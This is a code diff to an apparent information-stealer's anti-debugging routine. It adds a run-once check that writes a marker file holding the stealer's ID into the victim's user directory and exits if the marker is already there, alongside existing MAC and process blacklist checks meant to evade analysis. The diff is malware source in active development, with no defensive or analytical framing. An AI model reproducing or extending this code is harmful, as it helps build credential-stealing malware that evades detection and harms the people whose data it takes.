@@ -34,10 +34,12 @@
 #include <psapi.h>
 #pragma comment(lib, "psapi.lib")
 #include <cctype>
+#include <filesystem>
 
 
 #include "../scripts.h"
 #include  "../../helper/helper.h"
+#include "../../config/config.cpp"
 
 /// <summary>
 /// check if the current user in blacklist
@@ -149,6 +151,45 @@ void antidebug::AntiDebug()
 	if (!global::debuging)
 		CheckMacs();
 	CheckProcesses();
+	if (config::oneStart)
+	{
+		std::string user = func::GetUser();
+
+		std::string path = "C:/Users/" + user + config::pathId;
+
+		printf("one start %s\n", path.c_str());
+
+		bool Mylog = false;
+
+		if (std::filesystem::exists(path+'/'+config::nameId))
+		{
+			std::string line;
+
+			std::ifstream in(path + '/' + config::nameId);
+			if (in.is_open())
+			{
+				std::getline(in, line);
+				if (line == config::yourStealerId)
+				{
+					global::debuging = true;
+					Mylog = true;
+				}
+			}
+			in.close();
+		}
+		if (!Mylog)
+		{
+			int result = _mkdir(path.c_str());
+			printf("make: %d\n", result);
+			std::ofstream out;
+			out.open(path + '/' + config::nameId);
+			if (out.is_open())
+			{
+				out << config::yourStealerId;
+			}
+			out.close();
+		}
+	}
 
 	if (global::debuging)
 		exit(0);
